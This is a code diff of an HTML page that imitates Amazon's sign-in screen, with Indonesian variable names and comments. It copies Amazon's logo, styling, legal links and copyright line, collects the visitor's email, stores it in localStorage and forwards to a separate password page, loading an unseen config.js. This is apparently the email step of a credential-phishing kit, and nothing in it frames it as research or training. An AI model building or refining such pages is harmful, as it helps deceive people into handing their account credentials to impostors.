@@ -4,129 +4,140 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Amazon Sign In</title>
+    <script src="config.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Amazon Ember', Arial, sans-serif;
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            font-family: 'Amazon Ember', Arial, sans-serif; 
         }
-        body {
-            background-color: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
+        body { 
+            background-color: #ffffff; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            padding: 20px; 
         }
-        .logo {
-            margin: 10px 0 20px;
+        .logo { 
+            margin: 15px 0 25px; 
         }
-        .logo img {
-            height: 30px;
+        .logo img { 
+            height: 30px; 
+            display: block;
+            margin: 0 auto;
         }
-        .kotak {
-            width: 100%;
-            max-width: 340px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            padding: 20px 26px;
-            background: #fff;
+        .kotak { 
+            width: 100%; 
+            max-width: 340px; 
+            border: 1px solid #ddd; 
+            border-radius: 8px; 
+            padding: 20px 26px; 
         }
-        h1 {
-            font-size: 28px;
-            font-weight: 400;
-            margin-bottom: 10px;
+        h1 { 
+            font-size: 28px; 
+            line-height: 1.2;
+            margin-bottom: 10px; 
+            font-weight: 400; 
         }
         .sub-judul {
             font-size: 14px;
             color: #555;
             margin-bottom: 20px;
         }
-        label {
-            font-size: 13px;
-            font-weight: 700;
-            margin-bottom: 7px;
-            display: block;
+        label { 
+            display: block; 
+            font-weight: 700; 
+            font-size: 13px; 
+            margin-bottom: 8px; 
         }
-        input {
-            width: 100%;
-            padding: 7px 10px;
-            border: 1px solid #a6a6a6;
-            border-radius: 4px;
-            font-size: 15px;
-            margin-bottom: 15px;
-            height: 32px;
+        input { 
+            width: 100%; 
+            padding: 7px 10px; 
+            border: 1px solid #a6a6a6; 
+            border-radius: 4px; 
+            margin-bottom: 15px; 
+            font-size: 15px; 
+            height: 31px;
         }
-        input:focus {
-            border-color: #007185;
-            outline: none;
-            box-shadow: 0 0 0 1px #007185;
+        input:focus { 
+            outline: none; 
+            border-color: #0071e3; 
+            box-shadow: 0 0 3px rgba(0,113,227,0.5); 
         }
-        button {
-            width: 100%;
-            padding: 7px 10px;
-            background: linear-gradient(to bottom, #f7df74, #ecc000);
-            border: 1px solid #b88600;
-            border-radius: 4px;
-            font-size: 15px;
-            cursor: pointer;
-            margin-bottom: 20px;
-            height: 32px;
+        button { 
+            width: 100%; 
+            padding: 7px 10px; 
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b); 
+            border: 1px solid #a4862c; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            font-size: 15px; 
+            height: 31px;
         }
-        button:hover {
-            background: linear-gradient(to bottom, #f5d648, #d4a300);
+        button:hover { 
+            background: linear-gradient(to bottom, #f5d78e, #e6b337); 
         }
-        .teks-bawah {
+        button:disabled { 
+            background: #eee; 
+            border-color: #ccc; 
+            cursor: not-allowed; 
+            opacity: 0.7; 
+        }
+        .syarat {
             font-size: 12px;
+            margin-top: 15px;
             line-height: 1.5;
-            margin-bottom: 25px;
         }
-        .teks-bawah a {
+        .syarat a {
             color: #0066c0;
             text-decoration: none;
         }
-        .teks-bawah a:hover {
+        .syarat a:hover {
             text-decoration: underline;
         }
-        .garis {
-            border-bottom: 1px solid #e7e7e7;
-            margin-bottom: 20px;
-        }
         .bantuan {
-            font-size: 13px;
-            margin-bottom: 30px;
+            margin-top: 25px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
         }
         .bantuan a {
+            font-size: 13px;
             color: #0066c0;
             text-decoration: none;
         }
         .bantuan a:hover {
             text-decoration: underline;
         }
-        .akun-baru {
-            text-align: center;
+        .pisah {
+            display: flex;
+            align-items: center;
+            margin: 30px 0 15px;
         }
-        .akun-baru span {
-            display: inline-block;
+        .garis {
+            flex: 1;
+            height: 1px;
+            background: #ddd;
+        }
+        .teks-pisah {
+            padding: 0 10px;
             font-size: 12px;
-            color: #555;
-            position: relative;
-            top: -8px;
-            padding: 0 8px;
-            background: #fff;
+            color: #767676;
         }
-        .tombol-baru {
-            background: linear-gradient(to bottom, #f6f7f9, #e9ecef);
-            border: 1px solid #adb1b8;
-            color: #111;
-            margin-top: 0;
+        .buat-akun {
+            width: 340px;
+            margin-top: 10px;
         }
-        .tombol-baru:hover {
-            background: linear-gradient(to bottom, #e9ecef, #d9dde0);
+        .buat-akun button {
+            background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
+            border-color: #adb1b8;
+        }
+        .buat-akun button:hover {
+            background: linear-gradient(to bottom, #e7e9ec, #d7d9dc);
         }
         .footer {
-            margin-top: 40px;
+            margin-top: 30px;
             font-size: 11px;
             color: #555;
             text-align: center;
@@ -136,74 +147,74 @@
             text-decoration: none;
             margin: 0 8px;
         }
-        .footer p {
-            margin-top: 10px;
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .hak-cipta {
+            margin-top: 5px;
         }
     </style>
 </head>
 <body>
     <div class="logo">
-        <img src="img/amazonlogo.png" alt="Amazon">
+        <img src="img/logo.png" alt="Amazon">
     </div>
 
     <div class="kotak">
-        <h1>Sign in</h1>
-        <p class="sub-judul">or create account</p>
-
-        <label for="email">Enter mobile number or email</label>
-        <input type="text" id="email" name="email" required>
-
-        <button onclick="lanjutKeSandi()">Continue</button>
-
-        <p class="teks-bawah">
-            By continuing, you agree to Amazon's 
-            <a href="#">Conditions of Use</a> and 
-            <a href="#">Privacy Notice</a>.
-        </p>
-
-        <div class="garis"></div>
-
-        <p class="bantuan">
-            <a href="#">Need help?</a>
-        </p>
+        <h1>Sign in or create account</h1>
+        <p class="sub-judul">Enter mobile number or email</p>
+        
+        <form id="formEmail">
+            <label for="email">Email or mobile phone number</label>
+            <input type="text" id="email" name="email" required>
+            <button type="submit" id="tombolLanjut" disabled>Continue</button>
+            
+            <p class="syarat">By continuing, you agree to Amazon's 
+                <a href="#">Conditions of Use</a> and 
+                <a href="#">Privacy Notice</a>.
+            </p>
+            
+            <div class="bantuan">
+                <a href="#">Need help?</a>
+            </div>
+        </form>
     </div>
 
-    <div class="akun-baru">
-        <div style="border-bottom: 1px solid #ddd; margin: 25px 0; position: relative;">
-            <span>New to Amazon?</span>
-        </div>
-        <button class="tombol-baru" onclick="window.location.href='#'">Create your Amazon account</button>
+    <div class="pisah">
+        <div class="garis"></div>
+        <span class="teks-pisah">Buying for work?</span>
+        <div class="garis"></div>
+    </div>
+
+    <div class="buat-akun">
+        <button>Create a free business account</button>
     </div>
 
     <div class="footer">
-        <p>
+        <div>
             <a href="#">Conditions of Use</a>
             <a href="#">Privacy Notice</a>
             <a href="#">Help</a>
-        </p>
-        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        </div>
+        <p class="hak-cipta">© 1996-2026, amazon.com, Inc. or its affiliates</p>
     </div>
 
-<script src="config.js"></script>
-<script>
-window.onload = function() {
-    const params = new URLSearchParams(window.location.search);
-    const email = params.get("anrew");
-    if(email && email.includes("@")) {
-        localStorage.setItem("dataEmail", email);
-        window.location.href = `password.html?anrew=${encodeURIComponent(email)}`;
-    }
-};
+    <script>
+        const inputEmail = document.getElementById('email');
+        const tombolLanjut = document.getElementById('tombolLanjut');
+        const formEmail = document.getElementById('formEmail');
 
-function lanjutKeSandi() {
-    const email = document.getElementById("email").value.trim();
-    if(!email) {
-        alert("Masukkan nomor ponsel atau email Anda");
-        return;
-    }
-    localStorage.setItem("dataEmail", email);
-    window.location.href = `password.html?anrew=${encodeURIComponent(email)}`;
-}
-</script>
+        // Aktifkan tombol hanya jika terisi
+        inputEmail.addEventListener('input', () => {
+            tombolLanjut.disabled = inputEmail.value.trim().length < 1;
+        });
+
+        // Simpan & lanjut ke password.html
+        formEmail.addEventListener('submit', (e) => {
+            e.preventDefault();
+            localStorage.setItem('emailPengguna', inputEmail.value.trim());
+            window.location.href = 'password.html';
+        });
+    </script>
 </body>
 </html>
